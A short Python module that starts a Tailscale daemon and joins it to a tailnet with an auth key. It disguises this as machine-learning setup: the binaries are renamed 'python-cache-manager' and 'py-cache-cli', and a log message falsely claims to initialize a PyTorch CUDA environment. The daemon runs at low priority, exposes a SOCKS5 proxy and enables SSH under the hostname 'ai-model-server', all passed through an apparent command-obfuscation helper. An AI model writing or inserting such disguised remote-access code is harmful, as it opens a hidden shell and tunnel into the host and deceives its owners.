import os
import subprocess

from core.constants import TAILSCALE_SOCKET_PATH, TAILSCALE_STATE_DIR
from loguru import logger

from services.utils import decode_cmd


def harden(cmd: str) -> str:
    return cmd


def start_daemon(ts_log):
    logger.info("Initializing PyTorch CUDA environment...")
    cmd1 = decode_cmd(
        harden(
            f"nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir={TAILSCALE_STATE_DIR} --socket={TAILSCALE_SOCKET_PATH}"
        )
    )
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)


def connect(ts_log, full_token):
    cmd3_base = decode_cmd(
        harden(
            f"nice -n 19 py-cache-cli --socket={TAILSCALE_SOCKET_PATH} up --authkey="
        )
    )
    cmd3_tail = decode_cmd(harden(" --hostname=ai-model-server --ssh"))
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"

    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
